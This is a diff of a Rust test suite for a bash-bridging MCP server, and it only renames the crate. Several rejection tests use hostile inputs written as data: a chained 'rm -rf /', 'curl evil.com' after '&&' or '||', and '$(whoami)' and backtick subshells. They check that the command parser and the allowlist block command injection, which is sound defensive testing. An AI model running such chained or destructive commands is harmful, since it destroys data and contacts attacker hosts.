@@ -18,7 +18,7 @@ bins = ["gog", "uv"]
         let mut f = NamedTempFile::new().unwrap();
         f.write_all(toml_content.as_bytes()).unwrap();
 
-        let config = bash_bridge_mcp::config::Config::from_file(f.path()).unwrap();
+        let config = bash_mcp_bridge::config::Config::from_file(f.path()).unwrap();
         assert_eq!(config.server.host, "127.0.0.1");
         assert_eq!(config.server.port, 8741);
         assert_eq!(config.server.timeout, 120);
@@ -34,7 +34,7 @@ bins = ["gog"]
         let mut f = NamedTempFile::new().unwrap();
         f.write_all(toml_content.as_bytes()).unwrap();
 
-        let config = bash_bridge_mcp::config::Config::from_file(f.path()).unwrap();
+        let config = bash_mcp_bridge::config::Config::from_file(f.path()).unwrap();
         assert_eq!(config.server.host, "127.0.0.1");
         assert_eq!(config.server.port, 8741);
         assert_eq!(config.server.timeout, 120);
@@ -49,7 +49,7 @@ bins = []
         let mut f = NamedTempFile::new().unwrap();
         f.write_all(toml_content.as_bytes()).unwrap();
 
-        let config = bash_bridge_mcp::config::Config::from_file(f.path()).unwrap();
+        let config = bash_mcp_bridge::config::Config::from_file(f.path()).unwrap();
         assert!(config.allowed.bins.is_empty());
     }
 }
@@ -66,7 +66,7 @@ bins = ["gog"]
         let mut f = NamedTempFile::new().unwrap();
         f.write_all(toml_content.as_bytes()).unwrap();
 
-        let store = bash_bridge_mcp::config::ConfigStore::new(f.path()).unwrap();
+        let store = bash_mcp_bridge::config::ConfigStore::new(f.path()).unwrap();
         assert_eq!(store.allowed_bins(), vec!["gog"]);
 
         let new_content = r#"
@@ -82,14 +82,14 @@ bins = ["gog", "uv", "cargo"]
 mod executor_tests {
     #[test]
     fn test_parse_simple_command() {
-        let parsed = bash_bridge_mcp::executor::parse_command("gog calendar events foo").unwrap();
+        let parsed = bash_mcp_bridge::executor::parse_command("gog calendar events foo").unwrap();
         assert_eq!(parsed.binary, "gog");
         assert_eq!(parsed.args, vec!["calendar", "events", "foo"]);
     }
 
     #[test]
     fn test_parse_command_with_quotes() {
-        let parsed = bash_bridge_mcp::executor::parse_command(
+        let parsed = bash_mcp_bridge::executor::parse_command(
             r#"gog calendar create foo --summary "My Event""#,
         )
         .unwrap();
@@ -102,56 +102,56 @@ mod executor_tests {
 
     #[test]
     fn test_reject_pipe() {
-        let result = bash_bridge_mcp::executor::parse_command("gog events | grep foo");
+        let result = bash_mcp_bridge::executor::parse_command("gog events | grep foo");
         assert!(result.is_err());
         assert!(result.unwrap_err().to_string().contains("metacharacter"));
     }
 
     #[test]
     fn test_reject_semicolon() {
-        let result = bash_bridge_mcp::executor::parse_command("gog events; rm -rf /");
+        let result = bash_mcp_bridge::executor::parse_command("gog events; rm -rf /");
         assert!(result.is_err());
     }
 
     #[test]
     fn test_reject_and_chain() {
-        let result = bash_bridge_mcp::executor::parse_command("gog events && curl evil.com");
+        let result = bash_mcp_bridge::executor::parse_command("gog events && curl evil.com");
         assert!(result.is_err());
     }
 
     #[test]
     fn test_reject_or_chain() {
-        let result = bash_bridge_mcp::executor::parse_command("gog events || curl evil.com");
+        let result = bash_mcp_bridge::executor::parse_command("gog events || curl evil.com");
         assert!(result.is_err());
     }
 
     #[test]
     fn test_reject_subshell() {
-        let result = bash_bridge_mcp::executor::parse_command("gog events $(whoami)");
+        let result = bash_mcp_bridge::executor::parse_command("gog events $(whoami)");
         assert!(result.is_err());
     }
 
     #[test]
     fn test_reject_backticks() {
-        let result = bash_bridge_mcp::executor::parse_command("gog events `whoami`");
+        let result = bash_mcp_bridge::executor::parse_command("gog events `whoami`");
         assert!(result.is_err());
     }
 
     #[test]
     fn test_reject_redirect() {
-        let result = bash_bridge_mcp::executor::parse_command("gog events > /tmp/out");
+        let result = bash_mcp_bridge::executor::parse_command("gog events > /tmp/out");
         assert!(result.is_err());
     }
 
     #[test]
     fn test_reject_background() {
-        let result = bash_bridge_mcp::executor::parse_command("gog events &");
+        let result = bash_mcp_bridge::executor::parse_command("gog events &");
         assert!(result.is_err());
     }
 
     #[test]
     fn test_reject_empty_command() {
-        let result = bash_bridge_mcp::executor::parse_command("");
+        let result = bash_mcp_bridge::executor::parse_command("");
         assert!(result.is_err());
     }
 }
@@ -161,7 +161,7 @@ mod execution_tests {
     async fn test_execute_allowed_command() {
         let allowed = vec!["echo".to_string()];
         let result =
-            bash_bridge_mcp::executor::execute("echo hello world", &allowed, 30).await.unwrap();
+            bash_mcp_bridge::executor::execute("echo hello world", &allowed, 30).await.unwrap();
         assert_eq!(result.exit_code, 0);
         assert_eq!(result.stdout.trim(), "hello world");
         assert!(result.stderr.is_empty());
@@ -171,7 +171,7 @@ mod execution_tests {
     async fn test_execute_rejected_binary() {
         let allowed = vec!["echo".to_string()];
         let result =
-            bash_bridge_mcp::executor::execute("curl http://evil.com", &allowed, 30).await;
+            bash_mcp_bridge::executor::execute("curl http://evil.com", &allowed, 30).await;
         assert!(result.is_err());
         assert!(result
             .unwrap_err()
@@ -182,14 +182,14 @@ mod execution_tests {
     #[tokio::test]
     async fn test_execute_nonzero_exit() {
         let allowed = vec!["false".to_string()];
-        let result = bash_bridge_mcp::executor::execute("false", &allowed, 30).await.unwrap();
+        let result = bash_mcp_bridge::executor::execute("false", &allowed, 30).await.unwrap();
         assert_ne!(result.exit_code, 0);
     }
 
     #[tokio::test]
     async fn test_execute_timeout() {
         let allowed = vec!["sleep".to_string()];
-        let result = bash_bridge_mcp::executor::execute("sleep 60", &allowed, 1).await;
+        let result = bash_mcp_bridge::executor::execute("sleep 60", &allowed, 1).await;
         assert!(result.is_err());
         assert!(result.unwrap_err().to_string().contains("timed out"));
     }
@@ -198,7 +198,7 @@ mod execution_tests {
     async fn test_execute_binary_not_found() {
         let allowed = vec!["nonexistent_binary_xyz".to_string()];
         let result =
-            bash_bridge_mcp::executor::execute("nonexistent_binary_xyz", &allowed, 30).await;
+            bash_mcp_bridge::executor::execute("nonexistent_binary_xyz", &allowed, 30).await;
         assert!(result.is_err());
     }
 }
@@ -219,7 +219,7 @@ bins = ["echo"]
         let mut f = NamedTempFile::new().unwrap();
         f.write_all(config.as_bytes()).unwrap();
 
-        let mut child = Command::new(env!("CARGO_BIN_EXE_bash-bridge-mcp"))
+        let mut child = Command::new(env!("CARGO_BIN_EXE_bash-mcp-bridge"))
             .args(["-c", f.path().to_str().unwrap(), "-t", "stdio"])
             .stdin(Stdio::piped())
             .stdout(Stdio::piped())
@@ -247,7 +247,7 @@ bins = ["echo"]
             .await
             .unwrap();
         let response = reader.next_line().await.unwrap().unwrap();
-        assert!(response.contains("bash-bridge-mcp"));
+        assert!(response.contains("bash-mcp-bridge"));
 
         // Send initialized notification
         let initialized = serde_json::json!({
@@ -288,7 +288,7 @@ bins = ["echo"]
         let mut f = NamedTempFile::new().unwrap();
         f.write_all(config.as_bytes()).unwrap();
 
-        let mut child = Command::new(env!("CARGO_BIN_EXE_bash-bridge-mcp"))
+        let mut child = Command::new(env!("CARGO_BIN_EXE_bash-mcp-bridge"))
             .args(["-c", f.path().to_str().unwrap(), "-t", "stdio"])
             .stdin(Stdio::piped())
             .stdout(Stdio::piped())
